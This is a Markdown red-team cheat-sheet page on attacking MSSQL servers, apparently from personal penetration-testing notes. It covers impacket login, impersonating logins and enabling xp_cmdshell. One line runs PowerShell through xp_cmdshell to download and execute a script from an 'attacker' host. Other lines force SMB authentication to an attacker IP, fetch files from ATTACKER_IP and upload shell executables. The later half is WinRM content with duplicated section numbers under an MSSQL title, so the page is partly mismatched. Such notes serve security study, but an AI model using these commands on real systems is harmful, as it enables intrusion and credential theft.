---
title: 1433 MSSQL
parent: Services
grand_parent: Red Team
nav_order: 1433
---
# MSSQL

---

## Default Port

- 1433

---

## Service Info



---
## Common security issues



---

## 1. Login

```bash
impacket-mssqlclient Administrator:Password@192.168.50.18 -windows-auth
```
- -windows-auth Specifies logging in using Windows authentication mode


-windows-auth の意味

● Windows 認証モードでログインする指定

SQL Server には2種類の認証があります：

モード	内容
SQL Authentication	SQL独自ユーザー（saなど）
Windows Authentication	AD / NTLM / Kerberos
● -windows-auth を付けると：
NTLM認証（またはKerberos）でログイン
Windowsアカウントとして認証される
ドメイン環境で特に重要


## Checking permissions
```zsh
enum_impersonate
```

## Switching users
```zsh
execute as login = ‘appdev’
```

## List Databases
```zsh
select name from sys.databases;
```

## Use a Database
```zsh
use financial_planner;
```

## List Tables
```zsh
select * from financial_planner.INFORMATION_SCHEMA.TABLES;
```

## Check Data
```zsh
select * from users;
```

---
## [2. xp_cmdshell](docs/02_Red/99_attack_repo/251-300_win-mis/255_xp-cmdshell_change-user)


### Enable (sysadmin privileges required)

```powershell
SQL (zeus\db_user  guest@msdb)> 
```

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
```

```
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### Exec OS Command

```powershell
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker/shell.ps1\')"';
exec xp_dirtree '\\192.168.45.186\test';
```

---

## 2. Example

👉 Usually limited without credentials

```bash
curl -I http://<IP>:5985
```

---

## 3. Access / Interaction

### With Credentials

```bash
evil-winrm -i <IP> -u <USER> -p <PASS>
```

---

### With Hash

```bash
evil-winrm -i <IP> -u <USER> -H <NTLM_HASH>
```

---

## 4. Credential Hunting

👉 Credentials usually come from:

* [SMB](smb.md)
* [HTTP](http.md)
* [MSSQL](mssql.md)
* Password attacks → [Password Attacks](../03_initial_access/password_attacks.md)
### File Transfer (Upload / Download)

👉 Primary method: evil-winrm built-in transfer

#### Download (Target → Attacker)
```zsh
download file.txt
```

```zsh
download C:\Users\<USER>\Desktop\file.txt
```

#### Upload (Attacker → Target)
```zsh
upload shell.exe
```

```zsh
upload exploit.ps1 C:\Temp\exploit.ps1
```
Fallback Transfer (PowerShell)
```powershell
Invoke-WebRequest http://<ATTACKER_IP>/file.exe -OutFile C:\Temp\file.exe
```

---

## 5. Authenticated Actions

👉 Once connected:

```powershell
whoami
hostname
ipconfig
```

---

👉 Check privileges:

```powershell
whoami /priv
```

---

## 6. Remote Execution / Exploitation

👉 WinRM itself = execution channel

👉 If access works:
→ Direct shell obtained

---

👉 Alternative (Impacket):

```bash
impacket-wmiexec <USER>:<PASS>@<IP>
```

---

## 7. No Credentials?

👉 Try:

* Password spraying → [Password Attacks](../03_initial_access/password_attacks.md)
* Check reused creds from other services

---

## 8. Lateral Movement / Pivot

👉 Reuse credentials:

* Other hosts via WinRM
* SMB / RDP
- [ligolo](../05_pivot/ligolo.md)
- [chisel](../05_pivot/chisel.md)
- [ssh-tunnel](../05_pivot/ssh_tunnel.md)

---

👉 If shell obtained:

→ [Windows Privilege Escalation](../04_privesc/windows.md)
